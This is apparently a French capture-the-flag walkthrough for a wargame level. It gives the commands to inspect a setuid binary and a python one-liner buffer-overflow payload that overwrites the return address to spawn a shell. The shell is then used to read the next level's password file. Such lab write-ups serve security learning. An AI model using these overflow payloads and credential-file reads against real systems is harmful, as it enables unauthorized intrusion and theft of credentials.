# Level1 — Commandes

## Connexion

```bash
ssh level1@localhost -p 4242
```

Mot de passe : (récupéré en level0, dans `level0/flag`)

---

## Recon

### Étape 1 — Environnement et binaire

```bash
pwd
ls -la
file level1
readelf -h level1
```

**But :** Vérifier le home, le binaire setuid level2, type ELF et architecture.

### Étape 2 — Extraction pour analyse locale

Depuis l’hôte :

```bash
cd level1
sshpass -p '<level1_password>' scp -o StrictHostKeyChecking=no -P 4242 level1@localhost:level1 ./level1.bin
```

### Étape 3 — Analyse locale

```bash
file level1.bin
strings level1.bin
readelf -s level1.bin
objdump -d level1.bin
objdump -s -j .rodata level1.bin
```

**Résultats :** Voir `analysis.md`.

---

## Exploitation

### Étape 4 — Overflow : écraser l’adresse de retour par `run`

Sur la VM, en level1. **Garder stdin ouvert** pour que le shell reste actif (sinon le pipe se ferme et le shell quitte) :

```bash
( python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1
```

Tu dois voir "Good... Wait what?" puis un shell. Taper ensuite par exemple `id` puis `cat /home/user/level2/.pass`.

Si rien ne s’affiche, tester un autre offset (72 ou 80) à la place de 76 :

```bash
( python -c 'print "A"*72 + "\x44\x84\x04\x08"'; cat ) | ./level1
```

**But :** `gets()` lit sans limite. L’offset exact jusqu’à l’adresse de retour peut varier (68 d’après le binaire local, 76 souvent sur la VM). Remplacer par l’adresse de `run` (0x08048444) pour appeler `system("/bin/sh")`. On la remplace par l’adresse de `run` (0x08048444) qui appelle `system("/bin/sh")`.

### Étape 5 — Récupération du mot de passe level2

Dans le shell level2 obtenu :

```bash
id
cat /home/user/level2/.pass
```

### Étape 6 — Connexion level2

```bash
exit
ssh level2@localhost -p 4242
```

Consigner le mot de passe dans `level1/flag`.
